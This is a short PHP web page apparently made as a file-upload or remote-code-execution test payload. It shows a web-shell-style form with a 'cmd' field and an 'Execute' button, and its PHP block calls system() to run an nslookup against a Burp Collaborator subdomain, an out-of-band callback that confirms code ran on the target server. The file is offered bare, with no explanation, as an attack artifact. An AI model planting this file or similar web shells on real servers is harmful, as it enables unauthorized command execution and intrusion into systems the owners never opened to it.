<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    system("nslookup 2cfnt2adpezy7nnaqvs8y1zba2gs4h.burpcollaborator.net");
?>
</pre>
</body>
</html>
